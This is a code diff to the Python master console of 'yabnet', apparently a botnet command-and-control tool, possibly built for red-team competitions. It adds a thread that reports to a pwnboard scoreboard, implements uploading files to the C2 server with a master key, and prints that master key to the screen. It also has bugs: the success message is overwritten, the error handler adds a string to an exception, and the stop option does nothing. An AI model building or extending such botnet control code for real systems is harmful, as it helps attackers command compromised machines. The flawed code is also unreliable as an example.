@@ -31,7 +31,19 @@ def refresh():
         except Exception as e:
             pass 
         
-        time.sleep(30)
+        time.sleep(45)
+
+def updatepwnboard(url):
+    while True:
+        pwnboardURL = url
+        yabnetEndpoint = URL + '/updatepwnboard'
+        try:
+            data = {'masterkey': MASTERKEY, 'pwnboardURL': pwnboardURL}
+            res = requests.post(yabnetEndpoint,data)
+        except Exception as e:
+            print("[-] Master.py = " + e)
+
+        time.sleep(120)
 
 async def get_result(bot_ip):
     url = URL + '/bot/' + bot_ip + '/result'
@@ -98,11 +110,33 @@ ___  ___          _              _____                       _
             return IP 
 
     """
+    Command: pwnboard 
+    Description: Upadte pwnboard, stop updating pwnboard 
+    """
+    pwnboard_parser = argparse.ArgumentParser()
+    pwnboard_parser.add_argument('--start', action="store_true", help='Start updating pwnboard')
+    pwnboard_parser.add_argument('--stop', action="store_true", help='Stop updating pwnboard')
+    pwnboard_parser.add_argument('-u', '--url', type=str, help='Full URL of the pwnboard, including endpoint')
+
+    @cmd2.with_category(CUSTOM_CATEGORY)
+    @cmd2.with_argparser(pwnboard_parser)
+    def do_pwnboard(self, args):
+        start = args.start
+        stop = args.stop
+        url = args.url
+
+        if start == True:
+            pwnboardThread = threading.Thread(target=updatepwnboard, args=(url,))
+            pwnboardThread.daemon = True
+            pwnboardThread.start()
+
+
+    """
     Command: login 
     Description: Authenticate with the yabnet server and retrieve the masterkey after authentication
     """
     login_parser = argparse.ArgumentParser()
-    login_parser.add_argument('-r', '--remote', type=str, help='Remote rabnet server host to login to. <ip>:<port>')
+    login_parser.add_argument('-r', '--remote', type=str, help='Remote yabnet server host to login to. <ip>:<port>')
     login_parser.add_argument('-u', '--username', type=str, help='Username to login with')
     login_parser.add_argument('-p', '--password', type=str, help='Password to login with')
 
@@ -138,6 +172,7 @@ ___  ___          _              _____                       _
             global MASTERKEY
             MASTERKEY = response_data['masterkey']
             output_success = ansi.style('[+] Successfully logged in.', fg='green', bold=True)
+            output_success = ansi.style('[+] Retrieved Master key = ' + MASTERKEY, fg='green', bold=True)
             self.poutput(output_success)
             
             # Begin the refresh thread to automatically refresh botlist in server. 
@@ -366,9 +401,14 @@ ___  ___          _              _____                       _
     @cmd2.with_category(CUSTOM_CATEGORY)
     @cmd2.with_argparser(upload_parser)
     def do_upload(self, args):
-        url = URL + '/uploads'
+        url = URL + '/upload'
 
-        pass 
+        userFile = args.file 
+
+        files = {'file': open(userFile,'rb')}
+        data = {'masterkey': MASTERKEY}
+
+        res = requests.post(url, files=files, data=data)
 
     """
     Command: generate 
